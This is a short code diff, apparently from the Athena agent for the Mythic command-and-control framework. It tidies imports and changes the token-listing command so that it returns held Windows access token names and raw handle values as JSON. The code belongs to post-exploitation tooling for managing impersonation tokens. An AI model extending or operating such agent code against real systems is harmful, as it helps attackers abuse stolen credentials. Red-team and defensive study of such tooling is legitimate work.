@@ -2,14 +2,8 @@
 using Athena.Models.Commands;
 using Athena.Utilities;
 using Microsoft.Win32.SafeHandles;
-using System;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-using Athena.Models.Mythic.Checkin;
 using System.Text.Json;
-using Athena.Models;
 using System.Security.Principal;
 using Athena.Models.Responses;
 
@@ -121,18 +115,15 @@ namespace Athena.Commands
         public async Task<string> ListTokens(MythicJob job)
         {
             Dictionary<string,string> toks = new Dictionary<string, string>();
-            StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Tokens:");
-            sb.AppendLine("------------------------------");
             foreach (var token in tokens)
             {
-                sb.AppendFormat($"{token.Key}").AppendLine();
+                toks.Add(token.Key.ToString(), token.Value.DangerousGetHandle().ToString());
             }
 
             return new ResponseResult()
             {
                 completed = true,
-                user_output = sb.ToString(),
+                user_output = JsonSerializer.Serialize(toks),
                 task_id = job.task.id,
             }.ToJson();
         }
